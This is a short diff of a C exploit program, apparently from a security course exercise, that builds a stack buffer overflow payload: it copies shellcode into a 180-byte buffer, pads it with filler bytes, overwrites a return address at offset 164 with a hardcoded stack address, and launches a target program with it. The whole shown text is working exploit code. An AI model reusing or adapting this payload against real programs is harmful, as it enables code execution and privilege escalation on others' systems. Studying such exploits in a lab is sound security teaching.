@@ -12,10 +12,12 @@ int main(void)
 	char arg1[180];
 	strcpy(arg1, shellcode);
 	memset(arg1 + strlen(shellcode), 'A', sizeof(arg1)-37);
-	arg1[164]=0x70;
-	arg1[165]=0xfc;
-	arg1[166]=0xff;
-	arg1[167]=0xbe;
+	*((unsigned*)(&arg1[164]))  = 0xbefffc70;
+	arg1[179]=0;
+	//arg1[164]=0x70;
+	//arg1[165]=0xfc;
+	//arg1[166]=0xff;
+	//arg1[167]=0xbe;
 	char *args[] = { TARGET, arg1, NULL };
 	char *env[] = { NULL };
 	// return = befffd14
